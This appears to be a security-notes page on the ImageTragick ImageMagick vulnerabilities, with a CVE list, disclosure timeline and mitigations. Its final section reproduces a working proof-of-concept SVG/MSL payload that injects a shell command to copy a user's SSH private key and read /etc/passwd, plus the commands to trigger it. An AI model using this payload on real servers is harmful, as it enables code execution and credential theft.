# ImageTragick

ImageTragick or CVE-2016–3714 are  multiple vulnerabilities in [ImageMagick](https://www.imagemagick.org/). 
1. CVE-2016-3714 - Insufficient shell characters filtering leads to(potentially remote) code execution
2. CVE-2016-3718 - SSRF
3. CVE-2016-3715 - File deletion
4. CVE-2016-3716 - File moving
5. CVE-2016-3717 - Local file read (independently reported by original research author - [Stewie](https://hackerone.com/stewie))


[https://imagetragick.com](https://imagetragick.com/) states: *"There are multiple vulnerabilities in [ImageMagick](https://www.imagemagick.org/), a package commonly used by web services to process images. One of the vulnerabilities can lead to remote code execution (RCE) if you process user submitted images. The exploit for this vulnerability is being used in the wild. A number of image processing plugins depend on the ImageMagick library, including, but not limited to, PHP’s imagick, Ruby’s rmagick and paperclip, and nodejs’s imagemagick. If you use ImageMagick or an affected library, we recommend you mitigate the known vulnerabilities by doing at least one of these two things (but preferably both!):* ... see Mitigation section

Vulnerability Disclosure Timeline:
- April, 21 2016 - file read vulnerability report for one of My.Com services from https://hackerone.com/stewie received by Mail.Ru Security Team. Issue is reportedly known to ImageMagic team.
- April, 21 2016 - file read vulnerability patched by My.Com development team
- April, 28 2016 - code execution vulnerability in ImageMagick was found by Nikolay Ermishkin from Mail.Ru Security Team while researching original report
- April, 30 2016 - code execution vulnerability reported to ImageMagick development team
- April, 30 2016 - code execution vulnerability fixed by ImageMagick (incomplete fix)
- April, 30 2016 - fixed ImageMagic version 6.9.3-9 published (incomplete fix)
- May, 1 2016 - ImageMagic informed of the fix bypass
- May, 2 2016 - limited disclosure to 'distros' mailing list
- May, 3 2016 - public disclosure at https://imagetragick.com/

#### Official Mitigation

1. Verify that all image files begin with the expected ["magic bytes"](https://en.wikipedia.org/wiki/List_of_file_signatures) corresponding to the image file types you support before sending them to ImageMagick for processing. (see [FAQ](https://imagetragick.com/#FAQ) for more info)
2. Use a [policy file](https://www.imagemagick.org/script/resources.php) to disable the vulnerable ImageMagick coders. The global policy for ImageMagick is usually found in “/etc/ImageMagick”. The below policy.xml example will disable the coders EPHEMERAL, URL, MVG, and MSL.

#### MSL / Polyglot Attack

This section is a mirror from [0xsyr0/Awesome-Cybersecurity-Handbooks/ - 08_exploitation_tools.md](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/08_exploitation_tools.md)

> https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html

`poc.svg`
```c
<image authenticate='ff" `echo $(cat /home/<USERNAME>/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```
Execute payload:
```bash
convert poc.svg poc.png
cp /tmp/poc.svg /var/www/html/convert_images/
```

## References

[https://imagetragick.com](https://imagetragick.com/)
[0xsyr0/Awesome-Cybersecurity-Handbooks/ - 08_exploitation_tools.md](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/08_exploitation_tools.md)